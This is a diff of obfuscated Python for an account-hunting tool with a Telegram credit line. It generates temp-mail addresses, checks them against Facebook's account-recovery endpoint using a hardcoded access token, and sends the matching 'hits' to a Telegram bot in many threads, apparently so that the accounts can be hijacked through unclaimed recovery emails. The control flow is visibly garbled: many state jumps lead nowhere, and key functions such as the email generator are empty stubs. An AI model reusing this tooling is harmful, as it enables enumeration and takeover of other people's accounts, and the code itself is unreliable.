+				__cf_state__=2
+			if __cf_state__==2:break
+	def verify_custom(C,email,domain):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				try:
+					D=email.split('@')[0];A=C.get_captcha()
+					if not A:return
+					E={'accept':'application/json','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36','origin':'https://hi2.in'};F={'domain':domain,'prefix':D,'recaptcha':A};B=H.post('https://hi2.in/api/custom',headers=E,data=F,timeout=30)
+					if'address already taken'in B.text or'already taken'in B.text:return False
+					return True
+				except:return
+				__cf_state__=2
+			if __cf_state__==2:break
+	def check_fb(D,email):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				try:
+					A={'Host':'b-graph.facebook.com','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36'};B=f"q={email}&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&locale=en_US&method=GET&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32";C=H.post('https://b-graph.facebook.com/recover_accounts',headers=A,data=B,timeout=10).text
+					if'network_info'in C:return True
+					return False
+				except:return
+				__cf_state__=2
+			if __cf_state__==2:break
+	def get_video(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.video_lock:B=Z[A.video_pos];A.video_pos=(A.video_pos+1)%len(Z);return B
+				__cf_state__=2
+			if __cf_state__==2:break
+	def send_alert(A,email):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:__cf_state__=9 if not A.bot_key or not A.chat_id else 10;__cf_state__=2
+			if __cf_state__==2:B=f"""𓄅 𝒂𝒍𝒆𝒙 𝒑𝒚 
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘    
+
+𝗘𝗺𝗮𝗶𝗹 : 【 <code>{email}</code> 】
+𝒍𝒖𝒗 𝒚𝒐𝒖 𝒈𝒚𝒖𝒛 
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+
+<b>BY: @c0dealx</b>""";D=A.get_video();C={'inline_keyboard':[[{'text':'Dᴇᴠᴇʟᴏᴘᴇʀ','url':'http://t.me/c0dealx'}],[{'text':'Cʜᴀɴɴᴇʟ','url':'https://t.me/alexwithcodes'}]]};__cf_state__=3
+			if __cf_state__==3:
+				try:H.get(f"https://api.telegram.org/bot{A.bot_key}/sendVideo",params={'chat_id':A.chat_id,'video':D,'caption':B,'parse_mode':'HTML','reply_markup':Y.dumps(C)},timeout=10)
+				except:
+					try:H.get(f"https://api.telegram.org/bot{A.bot_key}/sendMessage",params={'chat_id':A.chat_id,'text':B,'parse_mode':'HTML','reply_markup':Y.dumps(C)},timeout=10)
+					except:pass
+				__cf_state__=4
+			if __cf_state__==4:break
+	def make_email(A,domain):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:__cf_state__=11 if True else 12;__cf_state__=2
+			if __cf_state__==2:break
+	def process(A,domain,output_file):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:B=A.make_email(domain);A.counter.current_target=B;A.counter.temp_counter+=1;C=A.check_fb(B);__cf_state__=2
+			if __cf_state__==2:__cf_state__=13 if C is True else 14;__cf_state__=3
+			if __cf_state__==3:break
+	def process_mixed(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:C=s.choice(w);E=v['mixed'];B=A.make_email(C);A.counter.current_target=B;A.counter.temp_counter+=1;D=A.check_fb(B);__cf_state__=2
+			if __cf_state__==2:__cf_state__=21 if D is True else 22;__cf_state__=3
+			if __cf_state__==3:break
+	def worker(A,domain,output_file,mode_type):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:global J;__cf_state__=2
+			if __cf_state__==2:__cf_state__=29 if not J else 30;__cf_state__=3
+			if __cf_state__==3:break
+J=False
+def b(counter):
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:D=counter.get_all();B.system('clear'if B.name=='posix'else'cls');C(f"\n\n{A} {S}𝐇ɪᴛs: {D['hit']}{A} {R}𝐁ᴀᴅ :{D['bad']}{A} {R}𝐁ᴀᴅ 𝐌ᴀɪʟ: {D['bad_mail']}{A}\n");__cf_state__=2
+		if __cf_state__==2:break
+def z(counter):
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:global J;__cf_state__=2
+		if __cf_state__==2:__cf_state__=31 if not J else 32;__cf_state__=3
+		if __cf_state__==3:break
+def A0():
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:global J;C(f"\n{T}1-{A}  {S}@hi2.in{A}");C(f"{T}2-{A}  {S}@telegmail.com{A}");C(f"{T}3-{A}  {I}MIXED MODE (Both Domains){A}");E=K(f"\n{I}𝐄ɴᴛᴇʀ 𝐂ʜᴀᴛ 𝐈ᴅ :{A}");F=K(f"{I}𝐄ɴᴛᴇʀ 𝐓ᴏᴋᴇɴ :{A}");H=K(f"\n{I}Enter choice (1-3): {A}").strip();M=a.get(H,a['1']);__cf_state__=2
+		if __cf_state__==2:
+			try:D=int(K(f"{I}Threads (default 80): {A}").strip()or'80')
+			except:D=80
+			__cf_state__=3
+		if __cf_state__==3:__cf_state__=33 if M['type']=='mixed'else 34;__cf_state__=4
+		if __cf_state__==4:B=x();B.start_moment=L.time();N=y(F,E,B);G.Thread(target=z,args=(B,),daemon=True).start();__cf_state__=5
+		if __cf_state__==5:__cf_iter__=iter(V(D));__cf_state__=35 if True else 36;__cf_state__=6
+		if __cf_state__==6:
+			try:
+				while True:b(B);L.sleep(1)
+			except U:J=True;L.sleep(1);b(B)
+			__cf_state__=7
+		if __cf_state__==7:break
+if __name__=='__main__':
+	try:A0()
+	except U:C(f"\n{I}[*] Done.{A}")
+	except M as A1:C(f"\n{R}[!] Error: {A1}{A}")
